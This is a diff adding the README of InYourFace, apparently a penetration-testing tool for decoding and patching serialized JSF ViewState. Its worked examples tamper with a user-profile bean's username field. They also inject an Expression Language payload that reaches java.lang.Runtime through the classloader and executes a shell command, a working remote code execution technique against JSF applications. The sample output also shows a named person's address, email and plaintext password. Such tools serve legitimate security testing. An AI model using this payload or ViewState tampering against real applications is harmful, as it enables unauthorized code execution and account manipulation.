@@ -1,0 +1,157 @@
+
+-- Introduction -------------------------------------------------
+
+ InYourFace is a software that can be used to patch JSF ViewState.
+ It is based on the jdeserialize library:
+ 
+ http://code.google.com/p/jdeserialize/
+
+
+-- Disclaimer --------------------------------------------------
+
+ The authors of this tool takes no responsibility for the way 
+ you use this tool. You are responsible for your own actions. 
+
+
+-- Compilation -------------------------------------------------
+
+ You can easily compile this tool with Ant. However, if you want to
+ prove that you are a Java Compilation Master Certified, I let you
+ find the suitable "javac" command yourself :]
+
+
+-- Usage -------------------------------------------------------
+
+ $> ./inyourface.sh -h
+ Usage: inyourface [options] <viewstate_file>
+   Options:
+     -h, -help
+        Display this message
+        Default: false
+     -outfile
+        Patched output file (default: stdout)
+     -patch
+        Patch class field (<obj_addr> <field_name> <value>)
+        Default: []
+     -pretty
+        Pretty print
+        Default: false
+     -raw
+        Raw output
+        Default: false
+     -rawpatch
+        Patch blockdata (<start_offset> <end_offset> <blockdata_file>)
+        Default: []
+
+
+-- Patch a class field -----------------------------------------
+
+ 1. detect the field to patch:
+ 
+ $> ./inyourface.sh /tmp/viewstate.txt
+ [...]
+ [instance 0x7e002b: 0x7e002a/com.itinpractice.beans.ProfileBean
+   s_offset: 921 / e_offset: 1109
+   field data:
+     0x7e002a/com.itinpractice.beans.ProfileBean:
+         password: r0x7e0029: [String 0x7e0029: "testtest"]
+         address: r0x7e0025: [String 0x7e0025: "17 rue plop 75001 Paris"]
+         username: r0x7e002c: [String 0x7e002c: "rdub"]
+         lastname: r0x7e0028: [String 0x7e0028: "dubourguais"]
+         firstname: r0x7e0027: [String 0x7e0027: "renaud"]
+         userId: 2
+         email: r0x7e0026: [String 0x7e0026: "renaud.dubourguais@synacktiv.com"]
+ ]
+ [...]
+ 
+ 2. patch the class field:
+ 
+ $> ./inyourface.sh -outfile /tmp/patched.txt -patch 0x7e002b username "TEST" /tmp/viewstate.txt
+ [...]
+ patching instance
+ field to patch @ from 1102 to 1109 | [String 0x7e002c: "rdub"]
+ new patch object registered / s_offset=1102 / e_offset=1109 / value=TEST
+ patching object @  s_offset=1102 / e_offset=1109 / size=7 / value=TEST
+ 
+ 3. check the changes:
+ 
+ $> ./inyourface.sh /tmp/patched.txt
+ [...]
+ [instance 0x7e002b: 0x7e002a/com.itinpractice.beans.ProfileBean
+   s_offset: 921 / e_offset: 1109
+   field data:
+     0x7e002a/com.itinpractice.beans.ProfileBean:
+         password: r0x7e0029: [String 0x7e0029: "testtest"]
+         address: r0x7e0025: [String 0x7e0025: "17 rue plop 75001 Paris"]
+         username: r0x7e002c: [String 0x7e002c: "TEST"]
+         lastname: r0x7e0028: [String 0x7e0028: "dubourguais"]
+         firstname: r0x7e0027: [String 0x7e0027: "renaud"]
+         userId: 2
+         email: r0x7e0026: [String 0x7e0026: "renaud.dubourguais@synacktiv.com"]
+ ]
+ [...]
+
+
+-- Patch a blockdata -------------------------------------------
+
+ 1. detect the blockdata:
+ 
+ $> ./inyourface.sh /tmp/viewstate.txt
+ [...]
+ [instance 0x7e000f: 0x7e000e/org.apache.el.ValueExpressionImpl
+   s_offset: 387 / e_offset: 468
+   object annotations:
+     org.apache.el.ValueExpressionImpl
+         [blockdata from 441 to 465: 23 bytes]
+            raw: \x17\x00\x03\x74\x62\x6c\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74
+            from 442 to 445: 3 bytes: tbl
+            from 447 to 463: 16 bytes: java.lang.Object
+ 
+         NULL
+         NULL
+ 
+   field data:
+     0x7e000c/javax.el.Expression:
+     0x7e000b/javax.el.ValueExpression:
+ ]
+ [...]
+ 
+ 2. patch the blockdata:
+ 
+ $> ./inyourface.sh -outfile /tmp/patched.txt -rawpatch 441 465 /tmp/patch.txt /tmp/viewstate.txt
+ 
+ 3. check the patch:
+ 
+ $> ./inyourface.sh /tmp/patched.txt
+ [...]
+ [instance 0x7e000f: 0x7e000e/org.apache.el.ValueExpressionImpl
+   s_offset: 387 / e_offset: 655
+   object annotations:
+     org.apache.el.ValueExpressionImpl
+         [blockdata from 441 to 652: 210 bytes]
+            raw: \xd2\x00\xbe\x23[...]\2e\x4f\x62\x6a\x65\x63\x74
+            from 442 to 632: 190 bytes: #{request.getClass().getClassLoader().loadClass('java.lang.Runtime').getDeclaredMethods()[6].invoke(null).exec('touch /tmp/PWNED')}
+            from 634 to 650: 16 bytes: java.lang.Object
+ 
+   field data:
+     0x7e000c/javax.el.Expression:
+     0x7e000b/javax.el.ValueExpression:
+ ]
+ [...]
+
+
+-- JDeserialize vs InYourFace ----------------------------------
+
+ Patches are available in the "patches" directory.
+ It allows to add features required by InYourFace from a clean 
+ jdeserialize build.
+
+
+-- Contact -----------------------------------------------------
+
+ This tool is provided by Synacktiv with no warranties and delivered 
+ "as is".
+ 
+ For questions, bug reports, ideas and contributions please contact
+ renaud.dubourguais@synacktiv.com or nicolas.collignon@synacktiv.com.
+
